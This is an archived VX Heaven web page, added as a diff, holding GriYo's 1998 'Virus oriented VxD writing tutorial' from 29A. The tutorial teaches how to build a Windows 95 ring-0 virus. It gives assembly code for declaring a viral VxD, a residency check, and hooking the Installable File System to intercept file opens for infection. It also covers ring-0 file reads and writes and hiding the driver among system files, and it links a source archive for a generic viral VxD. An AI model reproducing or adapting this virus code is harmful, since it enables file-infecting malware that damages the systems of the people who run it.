@@ -1,0 +1,489 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> GriYo 'Virus oriented VxD writing tutorial' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="GriYo"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, GriYo,Virus oriented VxD writing tutorial, init, control, path, handle, handler, version, called, call, segment, file, dword, memory, ends, code, system"/>
+<meta name="Description" content="This tutorial represents just a minimum introduction to VxD programming. To dominate the subject it deals with you need something more than this tutorial. Nevertheless, I've tried to explain everything very clearly, so noone stays on land ;)"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"af10201d9c31c40eee2783e2f3e870b24af197fe-1498757470-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vgy05.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Virus oriented VxD writing tutorial</h1><p><a href="/lib/?lang=en&amp;author=GriYo"> GriYo</a><br/> <em><a href="/vx.php?fid=6#f6">29a [2]</a></em><br/> <em>February 1998</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vgy05.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=WI#vgy05">Back to index</a>] [<a href="/lib/vgy05.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#p1">What is a VxD?</a></li>
+<li><a href="#p2">How to start</a></li>
+<li><a href="#p3">Writing a VxD</a></li>
+<li><a href="#p4">VxD segments</a></li>
+<li><a href="#p5">VxD declaration</a></li>
+<li><a href="#p6">VxD-ID</a></li>
+<li><a href="#p7">VxD Control Procedure</a></li>
+<li><a href="#p8">System Control Messages</a></li>
+<li><a href="#p9">Real mode initialization</a></li>
+<li><a href="#p10">VMM services of our interest</a></li>
+<li><a href="#p11">Installable File System</a></li>
+<li><a href="#p12">Cannonicalized paths</a></li>
+<li><a href="#p13">Installable File System services</a></li>
+<li><a href="#p14">Generic viral VxD</a></li>
+</ul>
+<p>This tutorial represents just a minimum introduction to VxD programming. To dominate the subject it deals with you need something more than this tutorial. Nevertheless, I've tried to explain everything very clearly, so noone stays on land ;)</p>
+<h2><a name="p1">What is a VxD?</a></h2>
+<p>Well, let's go with what we're interested on. A VxD is a 32-bit code chunk which executes in protected mode with RING-0 priviledge level. This is because they have to deal with system's resources, such as hardware devices and installed software. I hope after reaching this point there is no doubt about our intentions, right? it's about writing a VxD to control installed software (of course!). To achieve this, we'll pinch the system where we can cause more harm, the file system.</p>
+<h2><a name="p2">How to start</a></h2>
+<p>Before getting on to work we must get some tools. This software is available in the Microsoft Developer Network and a couple places more. You will need to get your hands on them if you're interesting on writing VxDs.</p>
+<ul>
+<li>Microsoft Macro Assembler (i used 6.11c).</li>
+<li>Linear-Executable Linker (i used 1.00.058).</li>
+<li>Microsoft SDK's ADDHDR.EXE and MAPSYM32.EXE.</li>
+</ul>
+<p>Since the first viruses for Windows95 written as VxD sources started to go around, I've found many people who look for the includes needed to compile these sources. You will need the following files from the SDK:</p>
+<dl>
+<dt>VMM.INC</dt>
+<dd>in this file you can find the macros and the defines of the Virtual Machine Manager services.</dd>
+<dt>DEBUG.INC</dt>
+<dd>only if you need to debug.</dd>
+<dt>SHELL.INC</dt>
+<dd>this file declares the services which provide access to many Windows functions, such as MessageBox.</dd>
+<dt>IFS.INC and IFSMGR.INC</dt>
+<dd>they're only necessary if we want to fuck around with the Windows95 file system.</dd>
+</dl>
+<p>The include files appear in the source between the .xlist and .list directrices.</p>
+<h2><a name="p3">Writing a VxD</a></h2>
+<p>Writing a VxD is something extremely easy if we use a generic source on which we will add our code. Let's divide the work into several stages, this way we may install and test the virus once we've completed each stage.</p>
+<p>First start with a generic VxD which contains the segment, VxD and control process declares. Later add the initialization procedure in real mode which is, as we will see, the well-known residency check. Now write the VxD initialization and file-hooking processes. And finally write the remaining VxD procedures.</p>
+<h2><a name="p4">VxD segments</a></h2>
+<p>Inside the VxD we can find five different types of segments, each of them with its own characteristics. So as to declare these segments we can use the following macros:</p>
+<dl>
+<dt>VxD_CODE_SEG and VxD_CODE_ENDS</dt>
+<dd>also called _LTEXT, this is the protected mode code segment. The declare of this segment is compulsory.</dd>
+<dt>VxD_DATA_SEG and VxD_DATA_ENDS</dt>
+<dd>also called _LDATA, they declare the data segment for global use in the VxD. It's also needed to declare it.</dd>
+<dt>VxD_ICODE_SEG and VxD_ICODE_ENDS</dt>
+<dd>also called _ITEXT. These two macros define the beginning and the end of the protected mode initialization code segment. This segment is optional and is discarded once completed the initialization (after receiving the Init_Complete message).</dd>
+<dt>VxD_IDATA_SEG and VxD_IDATA_ENDS</dt>
+<dd>also called _IDATA, here we may write all the necessary data for the initialization, which are discarded once the Init_Complete message is received. Its use is optional.</dd>
+<dt>VxD_REAL_INIT_SEG and VxD_REAL_INIT_ENDS</dt>
+<dd>this optional segment, called also _RTEXT, contains the procedure which the Virtual Machine Manager will call before loading the rest of the VxD. It is discarded once the procedure returns.</dd>
+</dl>
+<p>All these segments, except for _RTEXT (real mode initialization), are protected mode segments over a flat memory model. This means offsets are 32-bit and we will have to use the "offset32" macro in all the places in which we used "offset" before. Now CS, DS, ES and SS can't be modified, but instead we can use FS and GS.</p>
+<h2><a name="p5">VxD declaration</a></h2>
+<p>In order to declare our VxD we'll use the following macro:</p>
+<p>Declare_Virtual_Device name, major version, minor version, control procedure, device-ID, init order, V86 API handler, protected mode API handler</p>
+<p>Fuck, at first sight it looks a terrible thing, but lemme write an example, which i'm sure will change this first impression. We'll declare a VxD named ViRuS, which will be 1.0 version of our virus.</p>
+<pre class="source">
+Declare_Virtual_Device ViRuS,1,0,VxD_Control,Undefined_Device_ID,,,
+</pre>
+<p>As you can see I haven't used the last parameters, as we ain't neither interested in providing an API for other programs nor in init order (later?).</p>
+<h2><a name="p6">VxD-ID</a></h2>
+<p>It is a number which lets us differ an VxD from other. This is necessary if the VxD provides other programs an API or if it provides services to other VxDs. In our case we'll use Undefined_Device_ID as ID.</p>
+<h2><a name="p7">VxD Control Procedure</a></h2>
+<p>The Virtual Machine Manager sends control messages to the VxD using this procedure. This way it notifies several VxDs about certain events. Followin our last example, our control procedure would look like this:</p>
+<pre class="source">
+BeginProc VxD_Control ; Name of control procedure which we
+; declared with the VxD
+
+Control_Dispatch Sys_Critical_Init, ViRuS_Critical_Init
+Control_Dispatch Device_Init, ViRuS_Device_Init
+
+EndProc VxD_Control
+</pre>
+<p>By doing this we're declaring which procedures will run whenever certain system control messages are received. That is, run the ViRuS_Critical_Init procedure when a Sys_Critical_Init is received, and whenever a Device_Init message is received, run the ViRuS_Device_Init procedure.</p>
+<h2><a name="p8">System Control Messages</a></h2>
+<p>As we have said, the Virtual Machine Manager sends messages to VxDs so as to notify about certain changes in the system. There are many different messages, but, as we are only beginners, we are interested just in a few:</p>
+<dl>
+<dt>Sys_Critical_Init</dt>
+<dd>this is the first message our VxD will receive. As interruptions haven't been enabled yet, neither Simulate_Int nor Exec_Int may be used. Other init services are at our disposal, such as, Get_Exec_Path, which will provide us with the directory to install our VxD.</dd>
+<dt>Device_Init</dt>
+<dd>second message, which tells us interruptions are available now. It will be there, where we'll hang to the file system.</dd>
+<dt>Init_Complete</dt>
+<dd>third and last message related to system init. On return from the procedure which controls this message, the Virtual Machine Manager will discard the segments which contain code and data for the init (_ITEXT and _IDATA respectively).</dd>
+<dt>System_Exit</dt>
+<dd>this is the first message we will get on system shut down. Although interruptions are enabled, the services Simulate_Int and Exec_Int mustn't be used.</dd>
+<dt>Sys_Critical_Exit</dt>
+<dd>last shut down message, everything is clear...</dd>
+</dl>
+<p>In order to tell Windows95 to load our VxD we must add a line, DEVICE=VIRUS.VxD, to the [386Enh] section in the SYSTEM.INI, then copy the VxD to the \SYSTEM directory and reboot the system. Another solution is shown, for instance, in the Win95.Lizard virus by Reptile/29A, included in this issue. The trick consists on using the \IOSUBSYS directory.</p>
+<p>Windows95 may load a VxD dinamically, which is very interesting. However it carries the use of new messages to notify the dinamic start and stop. These techniques are not included in the objectives of this article because they are part of a more advanced subject and #$%!@!!! because I don't wanna waste the rest of my life writing this! :P</p>
+<h2><a name="p9">Real mode initialization</a></h2>
+<p>Thsi is the only part of a VxD in real mode. It runs on start of VxD load an initialization process. This procedure may be used to avoid the loading of the VxD, the loading of Windows, etc. We will use it for our residency check, and avoid loading again the VxD if it was already loaded. The Virtual Machine Manager calls this procedure with the following parameters:</p>
+<pre class="source">
+	AX -> VMM version number.
+		AH -> major version.
+		AL -> minor version.
+	BX -> Flags on load.
+	Duplicate_Device_ID -> a VxD with the same ID has been loaded.
+	Duplicate_From_INT2F -> same as the previous one, from int 2fh.
+	Loading_From_INT2F -> self explanatory :)
+	ECX ->	32-bit pointer, points to the entry for the real mode
+		initialization services routine, which allows things
+		such as reading the registry or SYSTEM.INI.
+	EDX -> pointer to int 2fh provided data, or null.
+	SI -> environment segment address, as passed by MS-DOS.
+</pre>
+<p>Our VxD may indicate the Virtual Machine Manager to perform several functions, such as reserving physical pages, by returned parameters:</p>
+<pre class="source">
+	AX -> action.
+</pre>
+<p>Abort_Device_Load: this is the value which we will return when the VMM tells us of a previously loaded VxD with the same VxD-ID. Prevents the VxD from being loaded without disturbing other VxDs.</p>
+<p>Abort_Win386_Load: tells VMM that everything is screwed up and it should better not load Windows (which is nearly always) :P</p>
+<p>Device_Load_Ok: when VMM receives this value, it understands that initialization is running with no problems, and that the loading process must continue.</p>
+<p>No_Fail_Message: this value is used in combination with Abort_Device_Load and with Abort_Win386_Load to prevent some error messages from appearing as a result of aborting Win or VxD loading.</p>
+<p>BX -> points to an array with the numbers of the pages to reserve for the VxD. This array ends in a NULL and contains pages ranging from 0000h to 0100h. If we don't want to reserve any pages, this value is kept equal to 0000h.</p>
+<p>EDX -> reference data, by now we'll set it to 00000000h.</p>
+<p>SI -> instance data, we'll also set it to 0000h.</p>
+<h2><a name="p10">VMM services of our interest</a></h2>
+<p>The Virtual Machine Manager is the heart of the operating system, as it is it the encharged to manage every virtual machine (hence, VMM). Moreover, it offers several services, some of which I'll describe as an example.</p>
+<dl>
+<dt>Get_Cur_VM_Handle</dt>
+<dd>Get in EBX a handle about the VM being executed right now.
+<pre class="source">
+	VMMcall	Get_Cur_VM_Handle
+	mov	[VM_handle],ebx
+</pre></dd>
+<dt>Get_Sys_VM_Handle</dt>
+<dd>Get in EBX a handle about the system VM.
+<pre class="source">
+	VMMcall Get_Sys_VM_Handle
+	mov	[SysVM_handle],ebx
+</pre></dd>
+<dt>Get_VMM_Version</dt>
+<dd>Get info about the VMM version.
+<pre class="source">
+	VMMcall Get_VMM_Version
+	mov	[Major],ah	; Major version number
+	mov	[Minor],al	; Minor version number
+	mov	[Debug],ecx	; Revision number
+</pre></dd>
+<dt>Get_Config_Directory</dt>
+<dd>This great function provides us with the complete path to the directory where Windows mantains the system files such as SYSTEM.INI.
+<pre class="source">
+	VMMcall Get_Config_Directory
+	mov	[win_path],edx
+</pre></dd>
+<dt>Get_Exec_Path</dt>
+<dd>Get a pointer to the path where Windows keeps the VMM32.VXD file. This will be the best directory regarding to save our viral VxD, hidden between system files in \SYSTEM.
+<pre class="source">
+	VMMcall Get_Exec_Path
+	mov	[path_ptr],edx
+	mov	[length],ecx
+</pre>
+<p>The ECX register keeps the number of characters in the path string, including last backlash "".</p></dd>
+<dt>_HeapAllocate</dt>
+<dd>Allocate memory in system's heap.
+<pre class="source">
+	VMMcall _HeapAllocate,&lt;#bytes,flags>
+
+	or	eax,eax		; eax = 00h if error
+	jz	not_allocated
+	mov	[block_ptr], eax; Pointer to allocated block
+
+	#bytes	-> specifies number of bytes to allocate
+	flags	-> refers to the following flags:
+</pre>
+<dl>
+<dt>HEAPLOCKEDIFDP</dt>
+<dd>allocate a memory block in a locked zone, only if using MS-DOS or BIOS functions in order to page.</dd>
+<dt>HEAPINIT</dt>
+<dd>this flag can only be specified during initialization. It allocates a memory block which will be automatically freed once init is completed.</dd>
+<dt>HEAPSWAP</dt>
+<dd>the block is allocated in a paged memory zone.</dd>
+<dt>HEAPZEROINIT</dt>
+<dd>the allocated block is initialized with 00h's.</dd>
+</dl></dd>
+<dt>_HeapFree</dt>
+<dd>Free a memory block allocated with last function.
+<pre class="source">
+	VMMcall _HeapFree,&lt;block_ptr,flags>
+
+	or	eax,eax		; eax = 00h if error
+	jz	error
+</pre></dd>
+<dt>Hook_V86_Int_Chain</dt>
+<dd>Add a new handler to a V86 interruption. Gollum virus uses this service in order to monitor calls to the interrupt 21h.
+<pre class="source">
+	mov	eax,int_number		; Int to hook
+	mov	esi,OFFSET32 my_handler	; Pointer to our handler
+	VMMcall Hook_V86_Int_Chain
+	jc	error			; Carry set if error encountered
+</pre></dd>
+</dl>
+<p>System calls new controller like this:</p>
+<pre class="source">
+	mov	eax,int_number		; Interruption
+	mov	ebx, VM			; Running VM handler
+	mov	ebp, OFFSET32 crs	; Pointer to the Client_Reg_Struc
+	call	[my_handler]
+
+	jc	pass_to_next		; Carry set if the funciton wasnt
+					; dispensed
+</pre>
+<p>We also have an Unhook_V86_Int_Chain, whose mission is to free the interruption handler just installed.</p>
+<pre class="source">
+	mov	eax,int_number		; Int number
+	mov	esi,OFFSET32 Hook_Proc	; Address to the procedure which
+					; will be erased from the chain
+
+	VMMcall	Unhook_V86_Int_Chain
+	jc	error			; Carry set if error encountered
+</pre>
+<h2><a name="p11">Installable File System</a></h2>
+<p>Here we have all those functions which we continuously use in MS-DOS and allow us to open files, read them, etc... it will be here where we will hook our virus so as to monitor every operation the system will perform on files in order to infect them. But let's go step by step.</p>
+<p>To perform our operations on files we will use a service which will provide us with the most common functions such as read, write, etc. Here it is:</p>
+<pre class="source">
+	mov	eax,R0_OPENCREATFILE	; Function to call
+
+	; Requiered Params
+	mov	cx,0			; - Attributes
+	mov	bx,2			; - Flags
+	mov	dx,0011h		; - Action and special flags
+	mov	esi,OFFSET32 filename	; - Guess what??? ;)
+
+	VxDCall IFSMgr_Ring0_FileIO	; And finally, the call
+</pre>
+<p>Then the only thing we need in order to start is to know how to call every function and how to pass the params. Well, this is the I/O form of some of the functions we will mostly use...</p>
+<dl>
+<dt>OpenCreateFile</dt>
+<dd>We will use this function to open or create files. Input params are:
+<pre>
+EAX -> function R0_OPENCREATFILE
+BX -> open mode and flags *
+CX -> attributes
+DH -> special flags (R0_NO_CACHE, R0_SWAPPER_CALL)
+DL -> action to perform *
+ESI -> pointer to the filename string
+</pre>
+<p>And output parameters are:</p>
+<pre>
+if CF=0
+
+EAX -> file handle
+ECX -> performed action *
+
+if CF=1 error
+
+* = Check int 21h function 6ch
+</pre></dd>
+<dt>ReadFile</dt>
+<dd>With R0_READFILE we'll read bytes from a previously opened file (with the R0_OPENCREATEFILE call). Following parameters are expected:
+<pre>
+EAX -> R0_READFILE
+EBX -> file handle
+ECX -> bytes to read
+EDX -> place on file where to start reading
+ESI -> pointer to buffer where to write data
+</pre>
+<p>Output:</p>
+<pre>
+if CF=0 then ECX = number of read bytes
+if CF=1 error
+</pre></dd>
+<dt>WriteFile</dt>
+<dd>That is, write into a file, params are:
+<pre>
+EAX -> R0_WRITEFILE
+EBX -> file handle
+ECX -> bytes to write
+EDX -> place in file where to start writing
+ESI -> pointer to the data we want to write
+</pre>
+<p>Output:</p>
+<pre>
+if CF=0 then ECX = number of written bytes
+if CF=1 error
+</pre></dd>
+<dt>CloseFile</dt>
+<dd>In order to close a just infected file ;) The input params are:
+<pre>
+EAX -> R0_CLOSEFILE
+EBX -> file handle
+</pre>
+<p>Output:</p>
+<pre>
+if CF=0 file was closed ok
+if CF=1 error (AX = errorcode)
+</pre></dd>
+<dt>GetFileSize</dt>
+<dd>I'm sure we'll find it useful. Use these parameters:
+<pre>
+EAX -> R0_GETFILESIZE
+EBX -> file handle
+</pre>
+<p>As a result:</p>
+<pre>
+if CF=0 then EAX = file size in bytes
+if CF=1 error (AX = errorcode)
+</pre></dd>
+</dl>
+<p>And well, we could start now, however we'll still need some more, such as FileAttributes, RenameFile, DeleteFile, or GetDiskFreeSpace. As a colorful note we also have WriteAbsoluteDisk and ReadAbsoluteDisk to fuck around a bit if we don't like hard drives... :)</p>
+<p>So we already know how to get on files, now we need to know how to hook up to the File System so we can monitor its activity. We'll use an IFS manager service, like this:</p>
+<pre class="source">
+	mov	eax,OFFSET32 hook_procedure 
+	push	eax 
+	VxDCall	IFSMgr_InstallFileSystemApiHook 
+	add	esp,0004h 
+	or	eax,eax 
+	jz	error
+	mov	dword ptr [prev_hook],eax
+	;Continue initialization process
+	clc
+	ret
+error:
+	stc
+	ret
+</pre>
+<p>This way we tell the file system the address of our monitor procedure. Lets see an example on writing this procedure...</p>
+<pre class="source">
+hook_procedure:
+
+	; Follow C calls rules
+	push	ebp
+	mov	ebp,esp
+	sub	esp,20h
+
+; At this point we can address the following params using
+; the stack:
+
+; ebp+00h -> saved EBP value.
+; ebp+04h -> return address.
+; ebp+08h -> supplies the address of the FSD function that
+; is to be called for this API.
+; ebp+0Ch -> supplies the function that is being performed.
+; ebp+10h -> supplies the 1-based drive the operation is being
+; performed on (-1 if UNC).
+; ebp+14h -> supplies the kind of resource the operation is being
+; performed on.
+; ebp+18h -> supplies the codepage that the user string was
+; passed in on.
+; ebp+1Ch -> supplies pointer to IOREQ structure.
+
+; Total 20h bytes
+
+; Next we'll do is check if this call has been performed by
+; the virus while infecting a file
+
+; Using a switch, we'll avoid dropping into an endless loop.
+
+	cmp	dword ptr [our_own_call],"BUSY"
+	je	exit_FS_hook
+
+; This is the moment in which we check the function being called
+
+	cmp	dword ptr [ebp+0Ch],IFSFN_OPEN
+	je	virus_OPEN_FILE
+
+exit_FS_hook:
+
+	mov	eax,dword ptr [ebp+1Ch]
+	push	eax
+	mov	eax,dword ptr [ebp+18h]
+	push	eax
+	mov	eax,dword ptr [ebp+14h]
+	push	eax
+	mov	eax,dword ptr [ebp+10h]
+	push	eax
+	mov	eax,dword ptr [ebp+0Ch]
+	push	eax
+	mov	eax,dword ptr [ebp+08h]
+	push	eax
+
+; Finally let's call last IFS monitor procedure
+
+	mov	eax,dword ptr [Prev_IFS_Hook]
+	call	dword ptr [eax]
+
+; The procedure is responsible for clearing the stack before
+; RETurning the control to the caller
+
+	add	esp,00000018h
+
+; RETurn
+
+	leave
+	ret
+</pre>
+<h2><a name="p12">Cannonicalized paths</a></h2>
+<p>Every path IFS manager passes to the FSD's is in Unicode. A cannonicalized path has quite different structure from that of C:\DOS we know so well ;)</p>
+<p>This structure composes of:</p>
+<p>1 WORD with the path's length (including this WORD but not the final NULL character).</p>
+<p>1 WORD with the offset of the path element of the string, each path element keeps info about a path's part.</p>
+<p>Various path elements. Their structure is composed of 1 WORD with the pathname length (including the self WORD) followed by an Unicode string with the name of that path element.</p>
+<p>All cannonicalized paths contain a complete path from the partition root.</p>
+<h2><a name="p13">Installable File System services</a></h2>
+<p>Some of these services have the format of a call in C so parameters are actually saves in the stack, depending on the function's necessities. Other services are written to be called from ASM, hence loading the params in the pertinent registers. The only service which can be useful for now is IFSMgr_GetVersion, which allows us to check IFS's version.</p>
+<dl>
+<dt>IFSMgr_GetVersion</dt>
+<dd>Input:
+<p>There are now input parameters</p>
+<p>Output:</p>
+<pre>
+If CF=0 then EAX keeps the IFS manager version number
+If CF=1 error
+</pre></dd>
+</dl>
+<h2><a name="p14">Generic viral VxD</a></h2>
+<p>This is an example for a generical viral VxD, over which to write the rest of the code. The project is composed of the following files:</p>
+<dl>
+<dt>VIRUS.ASM</dt><dd>ASM source with the viral VxD</dd>
+<dt>VIRUS.DEF</dt><dd>Module definition file</dd>
+<dt>VIRUS.LNK</dt><dd>Linker specifications file</dd>
+<dt>MAKEFILE </dt><dd>Project file</dd>
+</dl>
+<p><a href="files/vgy05/example.zip">Get the archive with the sources of example (2.5Kb)</a></p>
+<pre>
+			GriYo/29A
+			I'm not in the business... ... I am the business.
+</pre>
+[<a style="" href="/lib/?lang=EN&amp;index=WI#vgy05">Back to index</a>] [<a href="/lib/vgy05.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vgy05">de</a><a href="/lib/index.php?lang=en&amp;id=vgy05">en</a><a href="/lib/index.php?lang=es&amp;id=vgy05">es</a><a href="/lib/index.php?lang=it&amp;id=vgy05">it</a><a href="/lib/index.php?lang=fr&amp;id=vgy05">fr</a><a href="/lib/index.php?lang=pl&amp;id=vgy05">pl</a><a href="/lib/index.php?lang=ru&amp;id=vgy05">ru</a><a href="/lib/index.php?lang=ua&amp;id=vgy05">ua</a></div>
+</body>
+</html>
